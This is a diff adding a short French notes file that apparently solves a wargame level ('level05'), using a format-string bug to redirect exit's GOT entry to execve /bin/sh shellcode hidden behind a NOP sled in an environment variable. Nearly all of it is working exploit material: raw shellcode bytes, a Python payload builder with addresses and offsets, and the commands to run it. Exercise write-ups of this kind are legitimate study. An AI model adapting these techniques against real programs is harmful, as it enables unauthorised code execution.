@@ -1,0 +1,28 @@
+on a un printf suivi d'un exit le premier reflex est une format string où on va rediriger le GOT de exit vers notre shellcode
+
+Shellcode : 1\xc0\xb0\xbe\xcd\x801\xc91\xd2Qhn/shh//bi\x89\xe3j\x0bX\xcd\x80
+
+On va faire une stratégie déjà faite avant écrire sur les bits 2 par 2
+
+le padding est de 40 avec plusieurs test, et %x %x dans l'input, ce qui nous donne le 10ème argument pour printf
+
+on va mettre notre shellcode dans l'env et jump dessus
+
+```py
+import struct
+
+env_addr_hi = 0xffff
+env_addr_lo = 0xdae0 # appears to be stable when the shellcode is full of nopsleds, tried with 10000
+
+exit_got_addr = 0x080497E0
+
+exit_got = struct.pack("I", exit_got_addr)
+exit_got_2 = struct.pack("I", exit_got_addr + 2)
+
+# 8 is the size of the two addresses we print before our exploit
+print(exit_got + exit_got_2 + "%{}d%10$hn%{}d%11$hn".format(env_addr_lo - 8, env_addr_hi - env_addr_lo - 8))
+
+# python -c "import sys; sys.stdout.write('\x90'*10000 + '1\xc0\xb0\xbe\xcd\x801\xc91\xd2Qhn/shh//bi\x89\xe3j\x0bX\xcd\x80')" > shellcode
+# python exploit.py > payload
+# cat payload - | env -i S=$(cat shellcode) ./level05
+```
